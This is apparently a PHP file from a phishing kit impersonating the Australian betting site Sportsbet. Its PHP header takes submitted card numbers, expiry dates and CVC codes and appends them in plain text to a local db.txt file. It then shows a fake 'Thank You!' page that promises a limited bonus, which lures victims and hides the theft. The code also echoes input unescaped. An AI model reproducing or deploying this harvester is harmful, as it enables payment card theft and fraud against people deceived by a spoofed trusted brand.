<?php
extract($_POST);
$postData = array(
    "cardnumber" => $cardnumber,
    "cc_expiry_month" => $cc_expiry_month,
    "cc_expiry_year" => $cc_expiry_year,
    "cvc" => $cvc,
    "bonus" => $bonus,
);
$filename = dirname(__DIR__) . "/db.txt";

$txt = "Card Number: " . $cardnumber . ", " . "Expiry month: " . $cc_expiry_month . ", " . "Expiry year: " . $cc_expiry_year . ", " . "CVV: " . $cvc . ";\n";
$file_content = file_get_contents($filename);
$new_content = $file_content . $txt;
file_put_contents($filename, $new_content, LOCK_EX);

var_dump($postData);
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Thank You! | Sportsbet</title>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Language" content="en">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=.999, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#142841">
    <meta data-react-helmet="true" name="description" data-automation-id="page-description" content="Bet on horse racing, AFL, rugby and other events with Sportsbet. Join Australia's Favourite Online Betting and Entertainment Website.">
    <meta name="apple-mobile-web-app-title" content="Sportsbet">
    <meta name="application-name" content="Sportsbet">
    <meta name="msapplication-TileColor" content="#00549E">
    <link rel="apple-touch-icon" sizes="180x180" href="../images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../images/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="192x192" href="../images/android-chrome-192x192.png">
    <link rel="icon" type="image/png" sizes="16x16" href="../images/favicon-16x16.png">
    <link rel="manifest" href="../manifest.webmanifest">
    <link rel="mask-icon" href="../images/safari-pinned-tab.svg" color="#00549E">
    <link rel="preload" href="../fonts/Sportsbet-Icons.woff" as="font" crossorigin="">
    <link href="../css/normalize.css" rel="stylesheet">
    <link href="../css/style.css" rel="stylesheet">
</head>

<body>
    <section class="main">
        <div class="modalContent">
            <div class="headerContainerDesktop" data-automation-id="login-modal-header">
                <div class="centerLogo">
                    <div class="image" role="img" aria-label="" data-automation-id="sportsbet-logo"></div>
                </div>
                <div data-automation-id="modal-close-button" class="closeButtonContainer">
                    <div class="lighter">
                        <div class="border">
                            <div class="rippleGroup">
                                <div class="slow light entered"></div>
                            </div>
                            <button tabindex="0" class="iconContainer2" aria-label="">
                                <div tabindex="-1" class="noFocus"><i data-automation-id="closeIsolated" class="icon lighter closeIsolated SIZE_19"></i></div>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="bodyContainerFixedDesktop">
                <div class="registrationFormContainerDesktop">
                    <div class="titleCentered">
                        <h2 class="size22 SchoolBus title">Thank You!</h2>
                    </div>
                </div>
                <div class="loginContainer">
                    <div class="formCard">
                        <form action="https://www.sportsbet.com.au/">
                            <div class="bonus_text">Your bonus <?php echo $bonus;?> offer will be added to your account in the next 24 hours. This offer is limited to the first 500 participants.</div>
                            <div class="fullWidthWrapper" data-automation-id="login-button">
                                <div class="border">
                                    <div class="rippleGroup"></div><button tabindex="0" class="textButton" type="submit">
                                        <div tabindex="-1" class="noFocus">
                                            <div class="green insideButtonNormalContent">
                                                <div class="hover defaultCorners"><span class="textContainer">
                                                        <div class="buttonContent"><span class="size14 bold" data-automation-id="login-button-label">Continue</span></div>
                                                    </span></div>
                                            </div>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </section>

        <script src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/main.js"></script>

</body>

</html>